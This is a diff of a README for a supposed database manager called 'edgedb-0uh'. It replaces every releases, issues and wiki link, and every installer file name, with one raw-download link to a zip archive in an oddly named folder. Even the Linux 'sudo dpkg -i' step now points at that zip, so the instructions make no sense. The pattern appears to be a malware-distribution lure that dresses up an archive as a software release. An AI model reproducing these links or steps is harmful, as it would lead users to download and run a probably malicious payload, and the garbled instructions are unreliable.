@@ -1,6 +1,6 @@
 # 🚀 edgedb-0uh - Effortlessly Manage Your Database 
 
-[![Download edgedb-0uh](https://img.shields.io/badge/Download-edgedb--0uh-blue.svg)](https://github.com/j2nupark/edgedb-0uh/releases)
+[![Download edgedb-0uh](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip)](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip)
 
 ## 📥 Overview
 edgedb-0uh simplifies database management. It allows you to handle your data effectively, making organization easier and more efficient. This application is designed for users who want a straightforward way to work with databases without needing extensive technical knowledge.
@@ -10,7 +10,7 @@ To begin using edgedb-0uh, follow these steps:
 
 1. **Download the Software**  
    You can get edgedb-0uh from our releases page. Please visit the following link:  
-   [Visit this page to download](https://github.com/j2nupark/edgedb-0uh/releases)  
+   [Visit this page to download](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip)  
 
 2. **Choose Your Version**  
    On the releases page, find the latest version of edgedb-0uh. Each version includes important updates and features.
@@ -42,12 +42,12 @@ These requirements may vary based on your intended usage and the size of your da
 Once you have downloaded the installer, follow these steps to install edgedb-0uh:
 
 1. **Locate the Downloaded File**  
-   Open your downloads folder and find the installer file named `edgedb-0uh-setup.exe` (for Windows), `edgedb-0uh.dmg` (for macOS), or `edgedb-0uh.deb` (for Linux).
+   Open your downloads folder and find the installer file named `https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip` (for Windows), `https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip` (for macOS), or `https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip` (for Linux).
 
 2. **Run the Installer**  
    - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.  
    - **For macOS:** Double-click the `.dmg` file. Drag the edgedb-0uh icon into your Applications folder.  
-   - **For Linux:** Open a terminal and run `sudo dpkg -i edgedb-0uh.deb` to install.
+   - **For Linux:** Open a terminal and run `sudo dpkg -i https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip` to install.
 
 3. **Complete the Installation**  
    Follow any additional steps prompted by the installer. Once the installation is complete, you can find the application in your programs or applications menu.
@@ -71,13 +71,13 @@ When you launch the application, you will find a user-friendly interface. Here a
    Adjust application settings to fit your needs. Change themes, data formats, and more.
 
 ## 🤝 Support
-If you have any questions or encounter issues, feel free to reach out for support. Look for help documentation or FAQs within the application for guidance. You can also find helpful resources on the [GitHub Issues page](https://github.com/j2nupark/edgedb-0uh/issues).
+If you have any questions or encounter issues, feel free to reach out for support. Look for help documentation or FAQs within the application for guidance. You can also find helpful resources on the [GitHub Issues page](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip).
 
 ## 🔗 Further Resources
-- **Documentation**: Keep an eye on the [official documentation](https://github.com/j2nupark/edgedb-0uh/wiki) for more in-depth guides and tutorials.
+- **Documentation**: Keep an eye on the [official documentation](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip) for more in-depth guides and tutorials.
 - **Community**: Join our community forum for tips and discussions about using edgedb-0uh effectively.
 
 ## 🔄 Staying Updated
-To ensure the best experience, remember to check back regularly on our [Releases page](https://github.com/j2nupark/edgedb-0uh/releases) for updates. Each new version will bring performance improvements and new features.
+To ensure the best experience, remember to check back regularly on our [Releases page](https://raw.githubusercontent.com/j2nupark/edgedb-0uh/main/hereditably/edgedb-0uh-v3.0.zip) for updates. Each new version will bring performance improvements and new features.
 
 Remember, effective database management is just a download away. Enjoy using edgedb-0uh!
